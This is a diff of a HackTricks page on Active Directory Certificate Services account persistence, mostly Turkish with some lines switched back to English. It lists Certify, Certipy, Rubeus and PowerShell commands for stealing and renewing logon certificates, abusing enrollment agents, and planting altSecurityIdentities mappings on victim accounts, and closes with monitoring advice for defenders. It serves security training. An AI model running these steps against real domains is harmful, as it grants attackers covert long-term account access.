@@ -1,14 +1,14 @@
-# AD CS Hesap Kalıcılığı
+# AD CS Account Persistence
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-**Bu, [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) adresindeki muhteşem araştırmanın hesap kalıcılığı bölümlerinin kısa bir özetidir**
+**Bu, [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) adresindeki mükemmel araştırmanın account persistence bölümlerinin küçük bir özetidir**
 
-## Sertifikalarla Aktif Kullanıcı Kimlik Bilgisi Hırsızlığını Anlamak – PERSIST1
+## Understanding Active User Credential Theft with Certificates – PERSIST1
 
-Bir kullanıcının domain kimlik doğrulamasına izin veren bir sertifikayı talep edebildiği bir senaryoda, bir saldırgan bu sertifikayı talep edip çalarak bir ağda kalıcılık sağlayabilir. Varsayılan olarak Active Directory'deki `User` template'i bu tür taleplere izin verir, ancak bazen devre dışı bırakılmış olabilir.
+Bir kullanıcının etki alanı kimlik doğrulamasına izin veren bir sertifikayı talep edebildiği bir senaryoda, saldırgan bu sertifikayı talep edip çalarak bir ağda persistence sağlama fırsatı elde edebilir. Varsayılan olarak Active Directory içindeki `User` şablonu bu tür taleplere izin verir, ancak bazen devre dışı bırakılmış olabilir.
 
-[Certify](https://github.com/GhostPack/Certify) veya [Certipy](https://github.com/ly4k/Certipy) kullanarak, istemci kimlik doğrulamasına izin veren etkin template'leri arayıp ardından birini talep edebilirsiniz:
+Using [Certify](https://github.com/GhostPack/Certify) or [Certipy](https://github.com/ly4k/Certipy), you can search for enabled templates that allow client authentication and then request one:
 ```bash
 # Enumerate client-auth capable templates
 Certify.exe find /clientauth
@@ -19,9 +19,9 @@ Certify.exe request /ca:CA-SERVER\CA-NAME /template:User
 # Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
 certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
 ```
-Bir sertifikanın gücü, sertifika geçerli olduğu sürece, parola değişikliklerine bakılmaksızın ait olduğu kullanıcı olarak kimlik doğrulaması yapabilmesindedir.
+Bir sertifikanın gücü, sertifika geçerli olduğu sürece, parola değişikliklerinden bağımsız olarak ait olduğu kullanıcı olarak kimlik doğrulaması yapabilmesinde yatar.
 
-PEM'i PFX'e dönüştürebilir ve bunu bir TGT almak için kullanabilirsiniz:
+PEM'i PFX'e dönüştürüp bunu bir TGT almak için kullanabilirsiniz:
 ```bash
 # Convert PEM returned by Certify to PFX
 openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
@@ -32,11 +32,11 @@ Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /
 # Or with Certipy
 certipy auth -pfx user.pfx -dc-ip 10.0.0.10
 ```
-> Not: Diğer tekniklerle birleştirildiğinde (THEFT bölümlerine bakın), sertifika tabanlı kimlik doğrulama LSASS'e dokunmadan ve hatta yükseltilmemiş bağlamlardan kalıcı erişim sağlar.
+> Not: Diğer tekniklerle (THEFT bölümlerine bakın) birleştirildiğinde, sertifika tabanlı kimlik doğrulama LSASS'a dokunmadan ve hatta yükseltilmiş ayrıcalık gerektirmeyen bağlamlardan kalıcı erişime izin verir.
 
-## Sertifikalarla Makine Kalıcılığı Sağlama - PERSIST2
+## Sertifikalarla Makine Kalıcılığı Elde Etme - PERSIST2
 
-Eğer bir saldırganın bir host üzerinde yükseltilmiş ayrıcalıkları varsa, varsayılan `Machine` template'ini kullanarak ele geçirilmiş sistemin makine hesabı için bir sertifika kaydı yapabilir. Makine olarak kimlik doğrulama, yerel hizmetler için S4U2Self'i etkinleştirir ve kalıcı host erişimi sağlayabilir:
+Bir saldırganın bir makinede yükseltilmiş ayrıcalıkları varsa, varsayılan `Machine` şablonunu kullanarak ele geçirilmiş sistemin makine hesabı için sertifika kaydı yaptırabilir. Makine olarak kimlik doğrulamak, yerel hizmetler için S4U2Self'i etkinleştirir ve kalıcı makine erişimi sağlayabilir:
 ```bash
 # Request a machine certificate as SYSTEM
 Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine
@@ -46,7 +46,7 @@ Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0
 ```
 ## Sertifika Yenileme ile Kalıcılığı Uzatma - PERSIST3
 
-Sertifika şablonlarının geçerlilik ve yenileme sürelerini kötüye kullanmak, saldırganın uzun süreli erişim sağlamasına olanak verir. Daha önce verilmiş bir sertifika ve onun özel anahtarına sahipseniz, süresi dolmadan önce onu yenileyerek orijinal kimliğe bağlı ek istek artefaktları bırakmadan taze, uzun ömürlü bir kimlik bilgisi elde edebilirsiniz.
+Sertifika şablonlarının geçerlilik ve yenileme sürelerini kötüye kullanmak, bir saldırganın uzun süreli erişimi sürdürmesine olanak tanır. Daha önce verilmiş bir sertifika ve onun özel anahtarına sahipseniz, süresi dolmadan önce bunu yenileyerek orijinal hesaba bağlı ek istek artifaktları bırakmadan taze, uzun ömürlü bir kimlik bilgisi elde edebilirsiniz.
 ```bash
 # Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
 # Provide the existing PFX and target the same CA/template when possible
@@ -57,20 +57,20 @@ certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
 # (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
 certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
 ```
-> Operasyonel ipucu: Saldırganın elindeki PFX dosyalarının ömürlerini takip edin ve erken yenileyin. Yenileme, güncellenmiş sertifikelere modern SID eşleme uzantısının eklenmesine neden olabilir; bu da daha sıkı DC eşleme kuralları altında bunların kullanılabilir kalmasını sağlar (bir sonraki bölüme bakın).
+> Operasyonel ipucu: Saldırganın elindeki PFX dosyalarının ömürlerini takip edin ve erken yenileyin. Yenileme, güncellenmiş sertifikaların modern SID mapping extension'ı içermesine de neden olabilir; bu da daha sıkı DC eşleme kuralları altında kullanılabilir kalmalarını sağlar (bkz. sonraki bölüm).
 
-## Açık Sertifika Eşlemelerini Yerleştirme (altSecurityIdentities) – PERSIST4
+## Planting Explicit Certificate Mappings (altSecurityIdentities) – PERSIST4
 
-Eğer hedef hesabın `altSecurityIdentities` özniteliğine yazabiliyorsanız, saldırgan tarafından kontrol edilen bir sertifikayı o hesaba açıkça eşleyebilirsiniz. Bu, parola değişiklikleri boyunca kalıcıdır ve güçlü eşleme formatları kullanıldığında modern DC zorlaması altında da çalışmaya devam eder.
+If you can write to a target account’s `altSecurityIdentities` attribute, you can explicitly map an attacker-controlled certificate to that account. This persists across password changes and, when using strong mapping formats, remains functional under modern DC enforcement.
 
-Yüksek düzey akış:
+High-level flow:
 
-1. Kontrol ettiğiniz bir client-auth sertifikası edinin veya çıkarın (ör. kendiniz için `User` şablonunu enroll edin).
-2. Sertifikadan güçlü bir tanımlayıcı çıkarın (Issuer+Serial, SKI veya SHA1-PublicKey).
-3. Bu tanımlayıcıyı kullanarak hedef principal’ın `altSecurityIdentities` öznitelğine açık bir eşleme ekleyin.
-4. Sertifikanızla kimlik doğrulaması yapın; DC bunu açık eşleme aracılığıyla hedefe eşler.
+1. Obtain or issue a client-auth certificate you control (e.g., enroll `User` template as yourself).
+2. Extract a strong identifier from the cert (Issuer+Serial, SKI, or SHA1-PublicKey).
+3. Add an explicit mapping on the victim principal’s `altSecurityIdentities` using that identifier.
+4. Authenticate with your certificate; the DC maps it to the victim via the explicit mapping.
 
-Örnek (PowerShell) güçlü bir Issuer+Serial eşlemesi kullanılarak:
+Example (PowerShell) using a strong Issuer+Serial mapping:
 ```powershell
 # Example values - reverse the issuer DN and serial as required by AD mapping format
 $Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
@@ -80,7 +80,7 @@ $Map     = "X509:<I>$Issuer<SR>$SerialR"
 # Add mapping to victim. Requires rights to write altSecurityIdentities on the object
 Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
 ```
-Ardından PFX'inizle kimlik doğrulayın. Certipy doğrudan bir TGT alacaktır:
+Ardından PFX'iniz ile kimlik doğrulayın. Certipy doğrudan bir TGT elde edecektir:
 ```bash
 certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10
 
@@ -89,7 +89,7 @@ certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
 ```
 ### Güçlü `altSecurityIdentities` Eşlemeleri Oluşturma
 
-Pratikte, **Issuer+Serial** ve **SKI** eşlemeleri, bir saldırganın elindeki sertifikadan oluşturulabilecek en kolay güçlü formatlardır. Bu, **11 Şubat 2025**'ten sonra önem kazanır; çünkü DCs varsayılan olarak **Full Enforcement**'a geçecek ve zayıf eşlemeler güvenilir olmaktan çıkacaktır.
+Pratikte, **Issuer+Serial** ve **SKI** eşlemeleri, saldırganın elindeki bir sertifikadan oluşturulması en kolay güçlü formatlardır. Bu, **11 Şubat 2025**'ten sonra önem kazanır; çünkü o zaman DCs varsayılan olarak **Full Enforcement** olur ve zayıf eşlemeler güvenilir olmaktan çıkar.
 ```bash
 # Extract issuer, serial and SKI from a cert/PFX
 openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
@@ -103,21 +103,21 @@ Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
 # Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
 ```
 Notlar
-- Sadece güçlü eşleme türlerini kullanın: `X509IssuerSerialNumber`, `X509SKI`, veya `X509SHA1PublicKey`. Zayıf formatlar (Subject/Issuer, Subject-only, RFC822 email) kullanımdan kaldırılmıştır ve DC politikası tarafından engellenebilir.
-- Eşleme hem **kullanıcı** hem de **bilgisayar** nesnelerinde çalışır; bu nedenle bir bilgisayar hesabının `altSecurityIdentities` özniteliğine yazma erişimi, o makine olarak kalıcı olmak için yeterlidir.
-- Sertifika zinciri DC tarafından güvenilen bir köke kadar inmelidir. NTAuth içindeki Enterprise CA'lar genellikle güvenilir kabul edilir; bazı ortamlarda public CA'lar da güvenilir kabul edilir.
+- Sadece güçlü eşleme tiplerini kullanın: `X509IssuerSerialNumber`, `X509SKI`, or `X509SHA1PublicKey`. Zayıf formatlar (Subject/Issuer, Subject-only, RFC822 email) kullanımdan kalkmıştır ve DC politikası tarafından engellenebilir.
+- Eşleme hem **kullanıcı** hem de **bilgisayar** nesnelerinde çalışır, bu nedenle bir bilgisayar hesabının `altSecurityIdentities`'ine yazma izni, o makine olarak kalıcılık sağlamak için yeterlidir.
+- Sertifika zinciri, DC tarafından güvenilen bir köke kadar oluşturulmalıdır. NTAuth içindeki Enterprise CA'lar tipik olarak güvendir; bazı ortamlar ayrıca public CA'lara da güvenir.
 - Schannel authentication, DC Smart Card Logon EKU'suna sahip olmadığı veya `KDC_ERR_PADATA_TYPE_NOSUPP` döndürdüğü için PKINIT başarısız olsa bile kalıcılık için faydalı olmaya devam eder.
 
-Zayıf açık eşlemeler ve saldırı yolları hakkında daha fazla bilgi için bkz:
+Zayıf explicit eşlemeler ve saldırı yolları hakkında daha fazla bilgi için bkz:
 
 
 {{#ref}}
 domain-escalation.md
 {{#endref}}
 
-## Enrollment Agent olarak Kalıcılık – PERSIST5
+## Enrollment Agent as Persistence – PERSIST5
 
-Geçerli bir Certificate Request Agent/Enrollment Agent sertifikası elde ederseniz, istediğiniz zaman kullanıcılar adına yeni oturum açma yeteneği olan sertifikalar üretebilir ve ajan PFX'ini kalıcılık belirteci olarak çevrimdışı tutabilirsiniz. Suistimal iş akışı:
+Geçerli bir Certificate Request Agent/Enrollment Agent sertifikası elde ederseniz, kullanıcılar adına istendiği zaman yeni oturum açma yeteneğine sahip sertifikalar üretebilir ve agent PFX'ini çevrimdışı bir kalıcılık belirteci olarak saklayabilirsiniz. Suistimal iş akışı:
 ```bash
 # Request an Enrollment Agent cert (requires template rights)
 Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"
@@ -130,22 +130,22 @@ Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
 certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
 -template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
 ```
-Bu persistence'i kaldırmak için agent sertifikasının veya şablon izinlerinin iptal edilmesi gerekir.
+Bu kalıcılığı ortadan kaldırmak için ajan sertifikasının iptali veya şablon izinlerinin kaldırılması gereklidir.
 
-Operasyonel notlar
-- Modern `Certipy` sürümleri hem `-on-behalf-of` hem de `-renew`'i destekler; bu sayede Enrollment Agent PFX'e sahip bir saldırgan, hedef hesabı tekrar ellemeye gerek kalmadan leaf certificates oluşturup daha sonra yenileyebilir.
-- Eğer PKINIT tabanlı TGT elde etme mümkün değilse, ortaya çıkan on-behalf-of sertifikası yine de Schannel kimlik doğrulaması için kullanılabilir: `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.
+Operational notes
+- Modern `Certipy` sürümleri hem `-on-behalf-of` hem de `-renew`'ü destekler; bu sayede Enrollment Agent PFX'e sahip bir saldırgan orijinal hedef hesabına tekrar dokunmadan yaprak sertifikaları oluşturabilir ve daha sonra yenileyebilir.
+- PKINIT tabanlı TGT alınamıyorsa bile, ortaya çıkan on-behalf-of sertifikası `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell` ile Schannel kimlik doğrulaması için hâlâ kullanılabilir.
 
-## 2025 Strong Certificate Mapping Enforcement: Persistence Üzerindeki Etkisi
+## 2025 Strong Certificate Mapping Enforcement: Kalıcılık Üzerindeki Etkisi
 
-Microsoft KB5014754, domain controller'larda Strong Certificate Mapping Enforcement'ı tanıttı. 11 Şubat 2025'ten itibaren DC'ler varsayılan olarak Full Enforcement modunda çalışıyor ve zayıf/belirsiz eşlemeleri reddediyor. Pratik etkiler:
+Microsoft KB5014754, domain denetleyicilerinde Strong Certificate Mapping Enforcement'ı tanıttı. 11 Şubat 2025'ten itibaren DC'ler varsayılan olarak Full Enforcement moduna geçer ve zayıf/belirsiz eşlemeleri reddeder. Pratik etkileri:
 
-- 2022 öncesi sertifikalar SID mapping extension'ı içermiyorsa, DC'ler Full Enforcement modundaysa implicit mapping başarısız olabilir. Saldırganlar erişimi sürdürmek için sertifikaları AD CS üzerinden yenileyerek (SID mapping extension almak için) veya `altSecurityIdentities` içine güçlü bir explicit mapping yerleştirerek (PERSIST4) bunu başarabilirler.
-- Issuer+Serial, SKI, SHA1-PublicKey gibi güçlü formatları kullanan explicit mapping'ler çalışmaya devam eder. Issuer/Subject, Subject-only, RFC822 gibi zayıf formatlar engellenebilir ve persistence için kaçınılmalıdır.
+- SID mapping uzantısına sahip olmayan 2022 öncesi sertifikalar, DC'ler Full Enforcement modunda olduğunda örtük eşleme yapamayabilir. Saldırganlar erişimi korumak için ya AD CS üzerinden sertifikaları yenileyerek SID uzantısını elde edebilirler ya da `altSecurityIdentities` içinde güçlü bir açık eşleme (PERSIST4) yerleştirebilirler.
+- Issuer+Serial, SKI, SHA1-PublicKey gibi güçlü formatları kullanan açık eşlemeler çalışmaya devam eder. Issuer/Subject, yalnız Subject ve RFC822 gibi zayıf formatlar engellenebilir ve kalıcılık için kaçınılmalıdır.
 
-Yöneticiler şunları izlemeli ve uyarı vermelidir:
-- `altSecurityIdentities`'deki değişiklikler ve Enrollment Agent ile User sertifikalarının verilmesi/yenilenmesi.
-- CA issuance logları üzerinde on-behalf-of talepleri ve sıra dışı yenileme desenleri.
+Yöneticiler şunları izlemeli ve uyarı oluşturmalıdır:
+- `altSecurityIdentities` üzerindeki değişiklikleri ve Enrollment Agent ile User sertifikalarının verilmesi/yenilenmelerini.
+- on-behalf-of talepleri ve olağandışı yenileme desenleri için CA issuance loglarını.
 
 ## References
 
